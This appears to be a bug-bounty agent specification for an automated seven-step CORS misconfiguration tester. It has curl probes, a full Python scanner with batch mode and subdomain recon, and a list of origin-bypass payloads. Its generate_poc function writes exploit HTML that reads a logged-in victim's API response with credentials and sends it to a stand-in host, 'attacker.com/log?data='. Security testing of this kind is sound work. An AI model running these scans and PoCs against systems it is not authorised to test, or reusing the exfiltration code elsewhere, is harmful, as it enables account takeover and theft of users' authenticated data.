# CORS Chain Agent
# Automated 7-Step CORS Misconfiguration Chain Tester
# Based on the CVSS 8.1 finding on CLEAR (2026-04-10)

## Purpose
Test targets for exploitable CORS misconfigurations using a systematic 7-step chain.
Each step escalates from benign to critical. If a chain is found, output the full
exploitation path with proof-of-concept HTML.

## Usage
```
cors-chain <target_url> [--cookie SESSION_COOKIE] [--headers "Header: value"] [--output report.json]
cors-chain --batch domains.txt [--workers 10]
```

## Environment Requirements
- Python 3.10+
- requests library
- Optional: chromium/puppeteer for JS-based validation

## Step Definitions

### Step 1: Exact Origin Reflection
Test if the server reflects back the exact Origin header with Access-Control-Allow-Origin.
```bash
curl -s -D- -H "Origin: https://evil.com" "$TARGET" | grep -i "access-control"
```
If ACAO echoes "https://evil.com" back, the server blindly reflects origin.

### Step 2: Subdomain Wildcard Trust
Test if the server trusts any subdomain of the target.
```bash
curl -s -D- -H "Origin: https://evil.${TARGET_DOMAIN}" "$TARGET" | grep -i "access-control"
```
This catches configurations like `*.target.com` trust patterns.
A single XSS on any subdomain chains into full API access.

### Step 3: Postfix Bypass (target.com.attacker.com)
Test if origin validation only checks if the origin contains the target domain.
```bash
curl -s -D- -H "Origin: https://${TARGET_DOMAIN}.attacker.com" "$TARGET" | grep -i "access-control"
```
Regex like `/target\.com/` without anchoring allows this.

### Step 4: Prefix Bypass (attackertarget.com)
Test if origin validation checks startsWith or endsWith improperly.
```bash
curl -s -D- -H "Origin: https://attacker${TARGET_DOMAIN}" "$TARGET" | grep -i "access-control"
```
Catches string matching like `origin.endsWith('target.com')`.

### Step 5: Null Origin
Test if the server allows `Origin: null`.
```bash
curl -s -D- -H "Origin: null" "$TARGET" | grep -i "access-control"
```
null origin is achievable from sandboxed iframes, data: URIs, and redirects.
This is often the most exploitable variant.

### Step 6: Credentials Check
For every passing step above, verify if `Access-Control-Allow-Credentials: true` is set.
```bash
curl -s -D- -H "Origin: https://evil.com" "$TARGET" | grep -i "access-control-allow-credentials"
```
Without credentials, impact is limited to non-authenticated data.
WITH credentials, this is full account takeover potential (CVSS 8.1+).

### Step 7: Cross-Reference with CSP-Missing Siblings
Find sibling domains/subdomains that lack Content-Security-Policy headers.
If a CORS trust exists for a subdomain AND that subdomain has no CSP,
the chain is: XSS on CSP-less subdomain -> CORS on API -> authenticated data theft.
```bash
# Enumerate subdomains first
subfinder -d "$TARGET_DOMAIN" -silent | httpx -silent | while read sub; do
  csp=$(curl -s -D- "$sub" | grep -i "content-security-policy")
  if [ -z "$csp" ]; then
    echo "[NO-CSP] $sub"
  fi
done
```

## Full Python Implementation

```python
#!/usr/bin/env python3
"""
cors_chain.py - Automated 7-Step CORS Chain Tester
Usage: python3 cors_chain.py <target_url> [options]
"""

import argparse
import json
import sys
import re
import time
import concurrent.futures
from urllib.parse import urlparse
from dataclasses import dataclass, field, asdict
from typing import Optional

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] Install requests: pip install requests")
    sys.exit(1)


@dataclass
class CORSResult:
    step: int
    name: str
    origin_sent: str
    acao_received: Optional[str]
    acac_received: Optional[str]
    vulnerable: bool
    severity: str
    notes: str = ""


@dataclass
class ChainResult:
    target: str
    results: list = field(default_factory=list)
    chain_found: bool = False
    chain_description: str = ""
    cvss_estimate: float = 0.0
    poc_html: str = ""
    csp_missing_siblings: list = field(default_factory=list)


def extract_cors_headers(response):
    """Extract CORS-related headers from response."""
    acao = response.headers.get("Access-Control-Allow-Origin", "")
    acac = response.headers.get("Access-Control-Allow-Credentials", "")
    acam = response.headers.get("Access-Control-Allow-Methods", "")
    acah = response.headers.get("Access-Control-Allow-Headers", "")
    return acao, acac, acam, acah


def send_cors_request(target, origin, cookies=None, extra_headers=None, timeout=10):
    """Send a request with a specific Origin header."""
    headers = {"Origin": origin, "User-Agent": "Mozilla/5.0"}
    if extra_headers:
        headers.update(extra_headers)
    try:
        resp = requests.get(
            target,
            headers=headers,
            cookies=cookies,
            verify=False,
            timeout=timeout,
            allow_redirects=False,
        )
        return resp
    except requests.RequestException as e:
        return None


def step1_exact_origin(target, cookies=None, headers=None):
    """Test exact origin reflection."""
    evil_origin = "https://evil.com"
    resp = send_cors_request(target, evil_origin, cookies, headers)
    if resp is None:
        return CORSResult(1, "exact_origin_reflection", evil_origin, None, None, False, "info", "Request failed")
    acao, acac, _, _ = extract_cors_headers(resp)
    vuln = acao == evil_origin
    sev = "critical" if vuln and acac.lower() == "true" else "high" if vuln else "info"
    return CORSResult(1, "exact_origin_reflection", evil_origin, acao, acac, vuln, sev,
                      "Server reflects arbitrary Origin" if vuln else "")


def step2_subdomain_wildcard(target, target_domain, cookies=None, headers=None):
    """Test subdomain wildcard trust."""
    evil_origin = f"https://evil.{target_domain}"
    resp = send_cors_request(target, evil_origin, cookies, headers)
    if resp is None:
        return CORSResult(2, "subdomain_wildcard", evil_origin, None, None, False, "info", "Request failed")
    acao, acac, _, _ = extract_cors_headers(resp)
    vuln = acao == evil_origin
    sev = "high" if vuln and acac.lower() == "true" else "medium" if vuln else "info"
    return CORSResult(2, "subdomain_wildcard", evil_origin, acao, acac, vuln, sev,
                      "Trusts arbitrary subdomains - chain with subdomain XSS" if vuln else "")


def step3_postfix_bypass(target, target_domain, cookies=None, headers=None):
    """Test postfix bypass (target.com.attacker.com)."""
    evil_origin = f"https://{target_domain}.attacker.com"
    resp = send_cors_request(target, evil_origin, cookies, headers)
    if resp is None:
        return CORSResult(3, "postfix_bypass", evil_origin, None, None, False, "info", "Request failed")
    acao, acac, _, _ = extract_cors_headers(resp)
    vuln = acao == evil_origin
    sev = "critical" if vuln and acac.lower() == "true" else "high" if vuln else "info"
    return CORSResult(3, "postfix_bypass", evil_origin, acao, acac, vuln, sev,
                      "Origin contains() check without proper anchoring" if vuln else "")


def step4_prefix_bypass(target, target_domain, cookies=None, headers=None):
    """Test prefix bypass (attackertarget.com)."""
    evil_origin = f"https://attacker{target_domain}"
    resp = send_cors_request(target, evil_origin, cookies, headers)
    if resp is None:
        return CORSResult(4, "prefix_bypass", evil_origin, None, None, False, "info", "Request failed")
    acao, acac, _, _ = extract_cors_headers(resp)
    vuln = acao == evil_origin
    sev = "critical" if vuln and acac.lower() == "true" else "high" if vuln else "info"
    return CORSResult(4, "prefix_bypass", evil_origin, acao, acac, vuln, sev,
                      "Origin endsWith() check without dot boundary" if vuln else "")


def step5_null_origin(target, cookies=None, headers=None):
    """Test null origin acceptance."""
    resp = send_cors_request(target, "null", cookies, headers)
    if resp is None:
        return CORSResult(5, "null_origin", "null", None, None, False, "info", "Request failed")
    acao, acac, _, _ = extract_cors_headers(resp)
    vuln = acao == "null"
    sev = "critical" if vuln and acac.lower() == "true" else "high" if vuln else "info"
    return CORSResult(5, "null_origin", "null", acao, acac, vuln, sev,
                      "Exploitable via sandboxed iframe or data: URI redirect" if vuln else "")


def step6_credentials_amplifier(results):
    """Re-evaluate all findings based on credentials support."""
    for r in results:
        if r.vulnerable and r.acac_received and r.acac_received.lower() == "true":
            r.notes += " | CREDENTIALS ENABLED - full authenticated access"
            if r.severity == "high":
                r.severity = "critical"
            elif r.severity == "medium":
                r.severity = "high"
    return results


def step7_csp_siblings(target_domain):
    """Find subdomains missing CSP headers."""
    import subprocess
    missing_csp = []
    try:
        result = subprocess.run(
            f"subfinder -d {target_domain} -silent 2>/dev/null | head -50 | httpx -silent 2>/dev/null",
            shell=True, capture_output=True, text=True, timeout=120,
        )
        subdomains = result.stdout.strip().split("\n")
        for sub in subdomains:
            if not sub.strip():
                continue
            try:
                resp = requests.get(sub.strip(), timeout=5, verify=False, allow_redirects=True)
                csp = resp.headers.get("Content-Security-Policy", "")
                if not csp:
                    missing_csp.append(sub.strip())
            except Exception:
                continue
    except Exception:
        pass
    return missing_csp


def generate_poc(target, origin, uses_null=False):
    """Generate proof-of-concept HTML for the CORS exploit."""
    if uses_null:
        return f"""<!DOCTYPE html>
<html>
<head><title>CORS PoC - Null Origin</title></head>
<body>
<h2>CORS Exploit PoC (null origin via sandboxed iframe)</h2>
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<script>
fetch('{target}', {{
  credentials: 'include'
}})
.then(r => r.text())
.then(d => {{
  // Exfiltrate to attacker server
  new Image().src = 'https://attacker.com/log?data=' + encodeURIComponent(d);
  document.write('<pre>' + d + '</pre>');
}});
</script>
"></iframe>
</body>
</html>"""
    else:
        return f"""<!DOCTYPE html>
<html>
<head><title>CORS PoC - Origin Reflection</title></head>
<body>
<h2>CORS Exploit PoC</h2>
<script>
fetch('{target}', {{
  credentials: 'include'
}})
.then(r => r.text())
.then(d => {{
  // Exfiltrate to attacker server
  new Image().src = 'https://attacker.com/log?data=' + encodeURIComponent(d);
  document.getElementById('result').innerText = d;
}});
</script>
<pre id="result">Loading...</pre>
</body>
</html>"""


def build_chain(chain_result):
    """Analyze results and build the exploitation chain narrative."""
    vulns = [r for r in chain_result.results if r.vulnerable]
    if not vulns:
        chain_result.chain_found = False
        chain_result.chain_description = "No CORS misconfigurations found."
        chain_result.cvss_estimate = 0.0
        return chain_result

    has_creds = any(r.acac_received and r.acac_received.lower() == "true" for r in vulns)
    has_null = any(r.name == "null_origin" and r.vulnerable for r in vulns)
    has_reflection = any(r.name == "exact_origin_reflection" and r.vulnerable for r in vulns)
    has_subdomain = any(r.name == "subdomain_wildcard" and r.vulnerable for r in vulns)
    csp_missing = chain_result.csp_missing_siblings

    chain_result.chain_found = True
    chain_parts = []

    if has_null and has_creds:
        chain_parts.append("1. Attacker hosts page with sandboxed iframe (Origin: null)")
        chain_parts.append("2. Victim visits attacker page while authenticated")
        chain_parts.append("3. iframe sends credentialed request to target API")
        chain_parts.append("4. API returns Access-Control-Allow-Origin: null + credentials")
        chain_parts.append("5. Attacker JS reads response containing user data")
        chain_result.cvss_estimate = 8.1
        chain_result.poc_html = generate_poc(chain_result.target, "null", uses_null=True)

    elif has_reflection and has_creds:
        chain_parts.append("1. Attacker hosts evil.com with JS fetch to target API")
        chain_parts.append("2. Victim visits evil.com while authenticated to target")
        chain_parts.append("3. Browser sends credentialed cross-origin request")
        chain_parts.append("4. API reflects Origin and allows credentials")
        chain_parts.append("5. Attacker JS reads full API response")
        chain_result.cvss_estimate = 8.1
        chain_result.poc_html = generate_poc(chain_result.target, "https://evil.com")

    elif has_subdomain and has_creds and csp_missing:
        chain_parts.append(f"1. Find XSS on CSP-less subdomain (candidates: {', '.join(csp_missing[:3])})")
        chain_parts.append("2. XSS payload on subdomain sends credentialed fetch to API")
        chain_parts.append("3. API trusts subdomain origin with credentials")
        chain_parts.append("4. XSS reads and exfiltrates authenticated API response")
        chain_result.cvss_estimate = 7.5
        chain_result.poc_html = generate_poc(chain_result.target, f"https://vuln-sub.{urlparse(chain_result.target).hostname}")

    elif has_subdomain and has_creds:
        chain_parts.append("1. Requires XSS on any subdomain of the target")
        chain_parts.append("2. Subdomain XSS sends credentialed request to API")
        chain_parts.append("3. API trusts all subdomains with credentials")
        chain_parts.append("4. Attacker reads authenticated data via XSS+CORS chain")
        chain_result.cvss_estimate = 6.5

    else:
        best = vulns[0]
        chain_parts.append(f"CORS misconfiguration found: {best.name}")
        chain_parts.append(f"Severity limited: credentials={'yes' if has_creds else 'no'}")
        chain_result.cvss_estimate = 4.0 if has_creds else 2.0

    chain_result.chain_description = "\n".join(chain_parts)
    return chain_result


def run_chain(target, cookies=None, headers=None, skip_recon=False):
    """Execute the full 7-step CORS chain test."""
    parsed = urlparse(target)
    target_domain = parsed.hostname

    print(f"\n{'='*60}")
    print(f"  CORS Chain Test: {target}")
    print(f"{'='*60}\n")

    chain = ChainResult(target=target)

    # Steps 1-5
    steps = [
        ("Step 1: Exact Origin Reflection", lambda: step1_exact_origin(target, cookies, headers)),
        ("Step 2: Subdomain Wildcard", lambda: step2_subdomain_wildcard(target, target_domain, cookies, headers)),
        ("Step 3: Postfix Bypass", lambda: step3_postfix_bypass(target, target_domain, cookies, headers)),
        ("Step 4: Prefix Bypass", lambda: step4_prefix_bypass(target, target_domain, cookies, headers)),
        ("Step 5: Null Origin", lambda: step5_null_origin(target, cookies, headers)),
    ]

    for label, func in steps:
        print(f"[*] {label}...")
        result = func()
        chain.results.append(result)
        status = "\033[91mVULNERABLE\033[0m" if result.vulnerable else "\033[92mOK\033[0m"
        print(f"    ACAO: {result.acao_received} | ACAC: {result.acac_received} | {status}")
        if result.notes:
            print(f"    Note: {result.notes}")

    # Step 6: Re-evaluate with credentials
    print(f"\n[*] Step 6: Credentials Amplification...")
    chain.results = step6_credentials_amplifier(chain.results)

    # Step 7: CSP siblings
    if not skip_recon:
        print(f"[*] Step 7: Scanning siblings for missing CSP...")
        chain.csp_missing_siblings = step7_csp_siblings(target_domain)
        if chain.csp_missing_siblings:
            print(f"    Found {len(chain.csp_missing_siblings)} subdomains without CSP:")
            for s in chain.csp_missing_siblings[:5]:
                print(f"      - {s}")

    # Build chain
    chain = build_chain(chain)

    # Output
    print(f"\n{'='*60}")
    print(f"  CHAIN ANALYSIS")
    print(f"{'='*60}")
    if chain.chain_found:
        print(f"\n\033[91m[CHAIN FOUND] CVSS Estimate: {chain.cvss_estimate}\033[0m\n")
        print(chain.chain_description)
        if chain.poc_html:
            print(f"\n[PoC HTML saved - use --output to write to file]")
    else:
        print(f"\n\033[92m[NO CHAIN] Target appears safe.\033[0m")

    return chain


def run_batch(domains_file, workers=10, cookies=None, headers=None):
    """Run CORS chain test against multiple targets."""
    with open(domains_file) as f:
        targets = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    all_results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        futures = {
            executor.submit(run_chain, t, cookies, headers, skip_recon=True): t
            for t in targets
        }
        for future in concurrent.futures.as_completed(futures):
            target = futures[future]
            try:
                result = future.result()
                all_results.append(result)
            except Exception as e:
                print(f"[!] Error testing {target}: {e}")

    # Sort by CVSS
    all_results.sort(key=lambda x: x.cvss_estimate, reverse=True)
    return all_results


def main():
    parser = argparse.ArgumentParser(description="7-Step CORS Chain Tester")
    parser.add_argument("target", nargs="?", help="Target URL (e.g., https://api.target.com/user)")
    parser.add_argument("--batch", help="File with list of target URLs")
    parser.add_argument("--cookie", help="Session cookie (name=value)")
    parser.add_argument("--headers", help="Extra headers (JSON string)")
    parser.add_argument("--output", help="Output file (JSON)")
    parser.add_argument("--workers", type=int, default=10, help="Parallel workers for batch mode")
    parser.add_argument("--skip-recon", action="store_true", help="Skip Step 7 subdomain recon")
    args = parser.parse_args()

    cookies = None
    if args.cookie:
        name, value = args.cookie.split("=", 1)
        cookies = {name: value}

    extra_headers = None
    if args.headers:
        extra_headers = json.loads(args.headers)

    if args.batch:
        results = run_batch(args.batch, args.workers, cookies, extra_headers)
        if args.output:
            with open(args.output, "w") as f:
                json.dump([asdict(r) for r in results], f, indent=2)
            print(f"\n[+] Results written to {args.output}")
    elif args.target:
        result = run_chain(args.target, cookies, extra_headers, args.skip_recon)
        if args.output:
            with open(args.output, "w") as f:
                json.dump(asdict(result), f, indent=2)
            print(f"\n[+] Results written to {args.output}")
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
```

## Quick Reference Commands

### Single target test
```bash
python3 cors_chain.py https://api.target.com/v1/user/profile --cookie "session=abc123"
```

### Batch test from recon output
```bash
cat endpoints.txt | python3 cors_chain.py --batch /dev/stdin --workers 20 --output results.json
```

### Manual step-by-step curl verification
```bash
# Quick one-liner to test all origin variants
for origin in "https://evil.com" "https://evil.target.com" "https://target.com.evil.com" "https://eviltarget.com" "null"; do
  echo "=== Origin: $origin ==="
  curl -s -D- -H "Origin: $origin" -H "Cookie: session=TOKEN" "https://api.target.com/endpoint" 2>/dev/null | grep -i "access-control"
  echo
done
```

### Extract CORS headers from a HAR file
```bash
python3 -c "
import json, sys
har = json.load(open(sys.argv[1]))
for entry in har['log']['entries']:
    url = entry['request']['url']
    for h in entry['response']['headers']:
        if 'access-control' in h['name'].lower():
            print(f'{url}: {h[\"name\"]}: {h[\"value\"]}')
" traffic.har
```

## Integration with Other Agents

### Feed results to finding-chain-builder
```bash
python3 cors_chain.py https://api.target.com/v1/me --output cors_finding.json
# finding-chain-builder consumes this JSON as an input node
```

### Use ghost-recon output to find API endpoints
```bash
# ghost-recon discovers endpoints, cors-chain tests them
cat ghost_recon_output/endpoints.txt | while read url; do
  python3 cors_chain.py "$url" --skip-recon --output "cors_$(echo $url | md5sum | cut -c1-8).json"
done
```

## Severity Classification

| Scenario | CVSS | Report Priority |
|----------|------|----------------|
| Arbitrary origin + credentials | 8.1 | Critical - immediate report |
| Null origin + credentials | 8.1 | Critical - immediate report |
| Subdomain wildcard + credentials | 6.5-7.5 | High - report with chain |
| Postfix/prefix bypass + credentials | 8.1 | Critical - regex bypass |
| Any CORS without credentials | 2.0-4.0 | Low - note for chaining |
| Wildcard (*) without credentials | 0.0 | Informational only |

## Known Bypass Patterns

### Framework-Specific CORS Bugs
- **Spring Boot**: `@CrossOrigin` defaults to allow all origins
- **Express cors()**: Default config allows all origins
- **Django django-cors-headers**: `CORS_ORIGIN_ALLOW_ALL = True` in prod
- **ASP.NET**: `AllowAnyOrigin().AllowCredentials()` (blocked in newer versions)
- **Flask-CORS**: `CORS(app)` with no args allows everything

### Edge Cases to Test
```bash
# Backslash in origin (some parsers treat differently)
curl -H "Origin: https://evil.com%60target.com" "$TARGET"

# Tab character injection
curl -H $'Origin: https://evil.com\ttarget.com' "$TARGET"

# Port-based bypass
curl -H "Origin: https://target.com:evil.com" "$TARGET"

# Scheme variation
curl -H "Origin: http://target.com" "$TARGET"  # HTTP on HTTPS API

# Underscore subdomain
curl -H "Origin: https://evil_target.com" "$TARGET"
```
